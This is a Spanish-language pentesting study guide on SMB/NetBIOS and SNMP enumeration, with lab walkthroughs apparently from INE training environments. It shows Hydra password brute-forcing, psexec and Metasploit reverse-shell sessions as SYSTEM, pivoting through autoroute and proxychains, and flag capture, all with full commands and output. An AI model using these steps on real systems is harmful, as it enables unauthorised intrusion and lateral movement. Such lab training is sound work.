
# Enumeración en Windows

## <mark style="color:purple;">SMB & Netbios Enumeration</mark>

### Introducción

La enumeración de SMB (Server Message Block) y NetBIOS permite obtener información crítica de sistemas Windows en red:

* Usuarios 👤
* Recursos compartidos 📂
* Políticas 🔐
* Sistema operativo 🖥️

👉 Es una de las fases más importantes en pentesting interno.

#### 🌐 Puertos

| Servicio | Puerto                          |
| -------- | ------------------------------- |
| NetBIOS  | 137 (UDP), 138 (UDP), 139 (TCP) |
| SMB      | 445 (TCP)                       |

***

### Técnicas + comandos

#### 1. Enumeración básica SMB

```bash
nmap -p445 --script smb-os-discovery <IP>
```

👉 Detecta:

* Sistema operativo
* Nombre del host

***

#### 2. Enumeración de shares

```bash
smbclient -L //<IP> -N
```

👉 Lista recursos compartidos sin credenciales

***

#### 3. Acceso a un share

```bash
smbclient //<IP>/share -N
```

👉 Permite navegar y descargar archivos

***

#### 4. Enumeración de usuarios

```bash
rpcclient -U "" <IP> -c enumdomusers
```

👉 Lista usuarios del sistema

***

#### 5. Enumeración de grupos

```bash
rpcclient -U "" <IP> -c enumdomgroups
```

👉 Lista grupos del dominio

***

#### 6. Enumeración completa (todo en uno)

```bash
enum4linux -a <IP>
```

👉 Usuarios, shares, políticas, etc.

***

#### 7. Permisos de shares

```bash
smbmap -H <IP>
```

👉 Muestra:

* Lectura / escritura
* Shares accesibles

***

#### 8. Null Session (sin credenciales)

```bash
smbclient -L //<IP> -N
```

👉 Comprueba acceso anónimo

***

#### 9. Información NetBIOS

```bash
nbtscan <IP>
```

👉 Obtiene:

* Nombre de máquina
* Workgroup

***

#### 10. SMB Signing

```bash
nmap -p445 --script smb2-security-mode <IP>
```

👉 Comprueba si SMB signing está habilitado

***

#### 11. Versión SMB

```bash
nmap -p445 --script smb-protocols <IP>
```

👉 Detecta SMBv1, SMBv2, etc.

***

#### &#x20;12. Enumeración rápida con Nmap

```bash
nmap -p139,445 --script smb-enum-shares,smb-enum-users <IP>
```

👉 Shares + usuarios en un solo comando

***

### Flujo típico de pentesting

```bash
nmap -p139,445 --script smb* <IP>
smbclient -L //<IP> -N
rpcclient -U "" <IP> -c enumdomusers
smbmap -H <IP>
enum4linux -a <IP>
```

***

## <mark style="color:purple;">Lab</mark>

Aprenderás a enumerar el servicio SMB y a explotarlo utilizando diferentes herramientas de fuerza bruta y explotación. También se aborda el pivoteo y cómo aprovechar la utilidad de red para montar las unidades compartidas en la red pivote.

En este entorno de laboratorio, el usuario accederá a una instancia de Kali GUI. Se puede acceder a un servicio SMB vulnerable utilizando las herramientas instaladas en Kali en `http://demo.ine.local` y `http://demo1.ine.local`.

**Objetivo:** ¡Explotar el objetivo y encontrar la flag!

```bash
┌──(root㉿INE)-[~]
└─# cat /etc/hosts
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.1.0.15       INE
127.0.0.1 AttackDefense-Kali
10.10.37.3      INE
10.2.19.108    demo.ine.local
10.2.25.44    demo1.ine.local
```

Los objetivos son:

```
10.2.19.108   demo.ine.local  -> Red externa
10.2.25.44    demo1.ine.local -> Red interna
```

Solo tenemos conectividad con la máquina `10.2.19.108`, para acceder a la `10.2.25.44` deberemos usar pivoting.

### Atacando SMB

#### Escaneo de puertos

```bash
┌──(root㉿INE)-[~]
└─# nmap -sS -T5 demo.ine.local                                                                                                                                        
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-21 23:53 IST
Nmap scan report for demo.ine.local (10.2.23.37)
Host is up (0.0028s latency).
Not shown: 990 closed tcp ports (reset)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49160/tcp open  unknown
49161/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 1.38 seconds

```

#### Escaneo dirigido a SMB con Nmap

Vemos que además es una máquina Windows bastante antigua que podemos explotar fácilmente con Metasploit:

```bash
┌──(root㉿INE)-[~]
└─# nmap -p445 --script smb-os-discovery demo.ine.local
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-21 23:48 IST
Nmap scan report for demo.ine.local (10.2.23.37)
Host is up (0.0035s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2012 R2 Standard 9600 (Windows Server 2012 R2 Standard 6.3)
|   OS CPE: cpe:/o:microsoft:windows_server_2012::-
|   Computer name: attackdefense
|   NetBIOS computer name: ATTACKDEFENSE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-03-21T18:18:15+00:00

Nmap done: 1 IP address (1 host up) scanned in 2.22 seconds

```

#### Descubrir que usuario puede acceder a los shares

Observamos que el usuario `guest` puede acceder:

```bash
┌──(root㉿INE)-[~]
└─# nmap -p445 --script smb-security-mode demo.ine.local                                                                                                              
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-22 00:06 IST
Nmap scan report for demo.ine.local (10.2.23.37)
Host is up (0.0027s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Nmap done: 1 IP address (1 host up) scanned in 1.19 seconds
```

#### Enumeración de shares

```bash
┌──(root㉿INE)-[~]
└─# smbclient -L //demo.ine.local -N
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Documents       Disk      
        Downloads       Disk      
        IPC$            IPC       Remote IPC
        print$          Disk      Printer Drivers
        Public          Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to demo.ine.local failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Intentamos acceder pero no podemos, necesitamos contraseña para todos.

#### Enumeración de usuarios

```bash
┌──(root㉿INE)-[~]
└─# enum4linux -U 10.2.23.37                                                                                                                                
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Mar 22 00:02:11 2026

<---SNIP--->
========================================( Users on 10.2.23.37 )========================================
                                                                                                                                                                      
index: 0x1 RID: 0x3f1 acb: 0x00000210 Account: admin    Name: (null)    Desc: (null)                                                                                  
index: 0x2 RID: 0x1f4 acb: 0x00000210 Account: Administrator    Name: (null)    Desc: Built-in account for administering the computer/domain
index: 0x3 RID: 0x1f5 acb: 0x00000215 Account: Guest    Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0x4 RID: 0x3f2 acb: 0x00000210 Account: root     Name: (null)    Desc: (null)

user:[admin] rid:[0x3f1]
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[root] rid:[0x3f2]

enum4linux complete on Sun Mar 22 00:02:22 2026
```

También podríamos usar Nmap:

```bash
──(root㉿INE)-[~]
└─# nmap -p445 --script smb-enum-users demo.ine.local

Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-22 00:10 IST
Nmap scan report for demo.ine.local (10.2.23.37)
Host is up (0.0033s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-users: 
|   ATTACKDEFENSE\admin (RID: 1009)
|     Flags:       Password does not expire, Normal user account
|   ATTACKDEFENSE\Administrator (RID: 500)
|     Description: Built-in account for administering the computer/domain
|     Flags:       Password does not expire, Normal user account
|   ATTACKDEFENSE\Guest (RID: 501)
|     Description: Built-in account for guest access to the computer/domain
|     Flags:       Account disabled, Password does not expire, Normal user account, Password not required
|   ATTACKDEFENSE\root (RID: 1010)
|_    Flags:       Password does not expire, Normal user account

Nmap done: 1 IP address (1 host up) scanned in 2.30 seconds
```

Guardamos los 4 usuarios en un archivo `users.txt` para hacer fuerza bruta.

#### Bruteforce de SMB

```bash
┌──(root㉿INE)-[~]
└─# hydra -L users.txt -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-25.txt smb://demo.ine.local                                                          

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-22 00:16:22
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 2787 login tries (l:3/p:929), ~2787 tries per task
[DATA] attacking smb://demo.ine.local:445/
[445][smb] host: demo.ine.local   login: admin   password: tinkerbell
[445][smb] host: demo.ine.local   login: administrator   password: password1
[445][smb] host: demo.ine.local   login: root   password: elizabeth
1 of 1 target successfully completed, 3 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-22 00:16:24
```

Bingo! Obtenemos las 3 contraseñas de los admin.

#### Acceso ADMIN

Con Impacket-PSExec:

```bash
┌──(root㉿INE)-[~]
└─# impacket-psexec administrator@demo.ine.local

Impacket v0.12.0.dev1 - Copyright 2023 Fortra

Password:
[*] Requesting shares on demo.ine.local.....
[*] Found writable share ADMIN$
[*] Uploading file ZcBjUxlM.exe
[*] Opening SVCManager on demo.ine.local.....
[*] Creating service LkDG on demo.ine.local.....
[*] Starting service LkDG.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> cd C:\Users\Administrator\Documents

C:\Users\Administrator\Documents> type FLAG1.txt
8de67f44f49264e6c99e8a8f5f17110c
```

Con Metasploit (mejor para pivoting)

```bash
msfconsole

msf6 > use exploit windows/smb/psexec
msf6 exploit(windows/smb/psexec) > set rhosts demo.ine.local
msf6 exploit(windows/smb/psexec) > set SMBUser administrator
msf6 exploit(windows/smb/psexec) > set SMBPass password1
msf6 exploit(windows/smb/psexec) > exploit

[*] Started reverse TCP handler on 10.10.37.6:4444 
[*] 10.2.23.37:445 - Connecting to the server...
[*] 10.2.23.37:445 - Authenticating to 10.2.23.37:445 as user 'administrator'...
[*] 10.2.23.37:445 - Selecting PowerShell target
[*] 10.2.23.37:445 - Executing the payload...
[+] 10.2.23.37:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (176198 bytes) to 10.2.23.37
[*] Meterpreter session 1 opened (10.10.37.6:4444 -> 10.2.23.37:49435) at 2026-03-22 00:24:24 +0530

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

### Pivoting

Una vez que hemos comprometido la primera máquina, comprobaremos que tenemos conexión desde la primera máquina hacia la segunda. Para ello desde Meterpreter cambiamos a shell y hacemos un ping a la segunda máquina:

```shellscript
meterpreter > shell

Process 1860 created.
Channel 1 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32> ping 10.2.25.44

Pinging 10.2.25.44 with 32 bytes of data:
Reply from 10.2.25.44: bytes=32 time=2ms TTL=128
Reply from 10.2.25.44: bytes=32 time=1ms TTL=128
Reply from 10.2.25.44: bytes=32 time=1ms TTL=128
Reply from 10.2.25.44: bytes=32 time=1ms TTL=128

Ping statistics for 10.2.25.44:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss)
```

Tenemos conectividad hacia la IP!

#### Autoroute

```bash
meterpreter > run autoroute -s 10.2.25.0/24

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 10.2.25.0/255.255.255.0...
[+] Added route to 10.2.25.0/255.255.255.0 via 10.2.19.108
[*] Use the -p option to list all active routes
```

#### Configurar Socks Proxy en Metasploit

```bash
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set VERSION 4a
msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
msf6 auxiliary(server/socks_proxy) > exploit
[*] Auxiliary module running as background job 0.

[*] Starting the SOCKS proxy server
```

{% hint style="success" %}
El puerto 9050 es el que usa proxychains por defecto
{% endhint %}

#### Proxychains

```bash
┌──(root㉿INE)-[~]
└─# proxychains nmap -v -sT -Pn -sV demo1.ine.local

<---SNIP--->
Discovered open port 445/tcp on 10.2.25.44
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.2.25.44:3389  ...  OK
Discovered open port 3389/tcp on 10.2.25.44
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.2.25.44:139  ...  OK
Discovered open port 139/tcp on 10.2.25.44
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.2.25.44:135  ...  OK
Discovered open port 135/tcp on 10.2.25.44
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.2.25.44:49154  ...  OK
Discovered open port 49154/tcp on 10.2.25.44
<---SNIP--->
```

Tenemos SMB también en la segunda máquina! Vamos a enumerarlo.

### Enumeración de SMB interno

#### Migración a proceso estable

```bash
meterpreter > migrate -N explorer.exe
[*] Migrating from 1560 to 2784...
[*] Migration completed successfully.
```

#### Ver los Shares desde la Shell

Usaremos el comando net view y la IP de la segunda máquina:

```bash
meterpreter > shell

Process 892 created.
Channel 1 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32> net view 10.2.25.44
Shared resources at 10.2.25.44

Share name  Type  Used as  Comment  
-------------------------------------------------------------------------------
Documents   Disk                    
K           Disk                    
The command completed successfully.
```

#### Ver si los shares están disponibles

```bash
C:\Windows\system32> net use D: \\10.2.25.44\Documents
The command completed successfully.

C:\Windows\system32> net use D: \\10.2.25.44\K
System error 85 has occurred.
The local device name is already in use.

C:\Windows\system32> net use K: \\10.2.25.44\K
The command completed successfully.
```

#### Acceder a los Shares directamente

```bash
meterpreter > cd D:
meterpreter > ls
Listing: D:\
============

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  1425  fil   2022-01-04 10:37:41 +0530  Confidential.txt
100666/rw-rw-rw-  70    fil   2022-01-04 10:52:12 +0530  FLAG2.txt
040777/rwxrwxrwx  0     dir   2021-12-31 15:20:14 +0530  My Music
040777/rwxrwxrwx  0     dir   2021-12-31 15:20:14 +0530  My Pictures
040777/rwxrwxrwx  0     dir   2021-12-31 15:20:14 +0530  My Videos
100666/rw-rw-rw-  402   fil   2021-12-31 15:20:23 +0530  desktop.ini
```

#### Flag 2

```bash
meterpreter > cat FLAG2.txt
c8f58de67f44f49264e6c99e8f17110c
```

***

## <mark style="color:purple;">SNMP Enumeration</mark>

### Introducción

**SNMP (Simple Network Management Protocol)** es un protocolo usado para **gestionar y monitorizar dispositivos en red**:

* Routers
* Switches
* Servidores
* Impresoras

👉 Funciona sobre **UDP 161**

***

#### ⚠️ Problema de seguridad

SNMP usa **community strings** (como contraseñas):

* `public` (lectura)
* `private` (escritura)

👉 Muchas veces están mal configuradas → **filtración de información crítica**

***

#### 🌐 Puerto

```
UDP 161
```

***

### Enumeración SNMP&#x20;

#### 1. Detectar SNMP abierto

```bash
nmap -sU -p161 <IP>
```

```bash
nmap -sU -sV -p161 --script snmp-* <IP> > snmp_info
```

***

#### 2. Detectar community strings

```bash
nmap -sU -p161 --script snmp-brute <IP>
```

***

#### 3. Enumeración básica

```bash
snmpwalk -v2c -c public <IP>
```

👉 Si funciona → jackpot 🔥

***

#### 4. Información del sistema

```bash
snmpwalk -v2c -c public <IP> system
```

👉 Obtiene:

* hostname
* OS
* uptime

***

#### 5. Usuarios del sistema

```bash
snmpwalk -v2c -c public <IP> 1.3.6.1.4.1.77.1.2.25
```

👉 Usuarios Windows

***

#### 6. Procesos en ejecución

```bash
snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.25.4.2.1.2
```

***

#### 7. Software instalado

```bash
snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.25.6.3.1.2
```

***

#### 8. Interfaces de red

```bash
snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.2.2.1.2
```

***

#### 9. Rutas de red

```bash
snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.4.21.1.1
```

***

#### 10. Usar onesixtyone (rápido 🔥)

```bash
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt <IP>
```

👉 Encuentra community strings válidas

***

#### 11. snmp-check (todo en uno)

```bash
snmp-check <IP> -c public
```

👉 Output muy limpio:

* usuarios
* procesos
* servicios

***

#### Flujo típico de ataque

```bash
nmap -sU -p161 <IP>
onesixtyone -c snmp.txt <IP>
snmpwalk -v2c -c public <IP>
snmp-check <IP> -c public
```

***

### Lab

En este laboratorio, aprenderás a escanear la máquina objetivo para descubrir el servicio SNMP y a recopilar información utilizando scripts SNMP nmap y otras herramientas.

En este entorno de laboratorio, el usuario tendrá acceso a una instancia de Kali GUI. Se puede acceder a una instancia del servicio vulnerable utilizando las herramientas instaladas en Kali en `http://demo.ine.local`.

**Objetivo:** ¡Explotar el objetivo para obtener acceso a la consola y encontrar la flag!

```bash
┌──(root㉿INE)-[~]
└─# cat /etc/hosts
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.1.0.11       INE
127.0.0.1 AttackDefense-Kali
10.10.49.2      INE
10.2.21.146    demo.ine.local
```

Nuestro objetivo es `demo.ine.local`

#### Detectar SNMP abierto

```bash
┌──(root㉿INE)-[~]
└─# nmap -sU -sV -p161 demo.ine.local                                                                                                           
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-22 23:37 IST
Nmap scan report for demo.ine.local (10.2.21.146)
Host is up (0.0029s latency).

PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server (public)
```

#### Detectar Community Strings

```bash
┌──(root㉿INE)-[~]
└─# nmap -sU -p161 --script snmp-brute demo.ine.local                                                                                                                 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-22 23:33 IST
Nmap scan report for demo.ine.local (10.2.21.146)
Host is up (0.0029s latency).

PORT    STATE SERVICE
161/udp open  snmp
| snmp-brute: 
|   public - Valid credentials
|   private - Valid credentials
|_  secret - Valid credentials
```

#### Scripts SNMP y salida a archivo

```bash
┌──(root㉿INE)-[~]
└─# nmap -sU -sV -p161 --script snmp-* demo.ine.local > snmp_info    
```

```bash
cat snmp_info

161/udp open  snmp    SNMPv1 server (public)
| snmp-win32-users: 
|   Administrator
|   DefaultAccount
|   Guest
|   WDAGUtilityAccount
|_  admin
| snmp-netstat: 
<---SNIP--->
|   TCP  10.2.21.146:49724    10.2.19.34:443
|   TCP  10.2.21.146:49787    10.2.16.110:443
|   TCP  10.2.21.146:49794    10.2.30.254:443
|   TCP  10.2.21.146:49797    23.52.181.141:80
|   TCP  10.2.21.146:49798    20.190.159.68:443
```

Encontramos varios usuarios de SNMP. Nos interesa el usuario `administrator`.

#### SNMP Bruteforce

```bash
┌──(root㉿INE)-[~]
└─# hydra -l administrator -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-30.txt demo.ine.local smb
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-22 23:45:57
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 1556 login tries (l:1/p:1556), ~1556 tries per task
[DATA] attacking smb://demo.ine.local:445/
[445][smb] host: demo.ine.local   login: administrator   password: elizabeth
1 of 1 target successfully completed, 1 valid password found
```

Encontramos la contraseña en plano!

#### Explotación

<pre class="language-bash"><code class="lang-bash">msfconsole

<strong>msf6 > use exploit windows/smb/psexec
</strong>msf6 exploit(windows/smb/psexec) > set rhosts demo.ine.local
rhosts => demo.ine.local
msf6 exploit(windows/smb/psexec) > set SMBUser administrator
SMBUser => administrator
msf6 exploit(windows/smb/psexec) > set SMBPass elizabeth
SMBPass => elizabeth
msf6 exploit(windows/smb/psexec) > exploit

[*] Started reverse TCP handler on 10.10.49.2:4444 
[*] 10.2.21.146:445 - Connecting to the server...
[*] 10.2.21.146:445 - Authenticating to 10.2.21.146:445 as user 'administrator'...
[*] 10.2.21.146:445 - Selecting PowerShell target
[*] 10.2.21.146:445 - Executing the payload...
[+] 10.2.21.146:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (176198 bytes) to 10.2.21.146
[*] Meterpreter session 1 opened (10.10.49.2:4444 -> 10.2.21.146:49857) at 2026-03-22 23:53:30 +0530

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
</code></pre>

Obtenemos la flag en el directorio C:

```powershell
meterpreter > ls
Listing: C:\
============

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
040777/rwxrwxrwx  0       dir   2020-11-07 13:45:59 +0530  $Recycle.Bin
100666/rw-rw-rw-  1       fil   2018-09-15 12:42:30 +0530  BOOTNXT
040777/rwxrwxrwx  8192    dir   2020-09-09 10:08:52 +0530  Boot
040777/rwxrwxrwx  0       dir   2018-11-14 21:40:15 +0530  Documents and Settings
040777/rwxrwxrwx  0       dir   2018-11-14 12:26:18 +0530  EFI
100666/rw-rw-rw-  70      fil   2022-01-03 13:58:44 +0530  FLAG1.txt
040777/rwxrwxrwx  0       dir   2020-05-13 23:28:09 +0530  PerfLogs
040555/r-xr-xr-x  4096    dir   2020-11-07 13:17:23 +0530  Program Files
040777/rwxrwxrwx  4096    dir   2020-11-07 13:17:24 +0530  Program Files (x86)
040777/rwxrwxrwx  4096    dir   2020-11-07 13:17:24 +0530  ProgramData
040777/rwxrwxrwx  0       dir   2020-11-07 06:12:52 +0530  Recovery
040777/rwxrwxrwx  4096    dir   2020-11-07 12:06:43 +0530  System Volume Information
040555/r-xr-xr-x  4096    dir   2020-11-07 13:45:53 +0530  Users
040777/rwxrwxrwx  0       dir   2020-11-07 13:19:05 +0530  Utilities
040777/rwxrwxrwx  16384   dir   2026-03-22 23:51:35 +0530  Windows
100444/r--r--r--  408692  fil   2020-09-09 10:03:42 +0530  bootmgr
000000/---------  0       fif   1970-01-01 05:30:00 +0530  pagefile.sys

meterpreter > cat FLAG1.txt 
a8f5f167f44f4964e6c998dee827110c
```
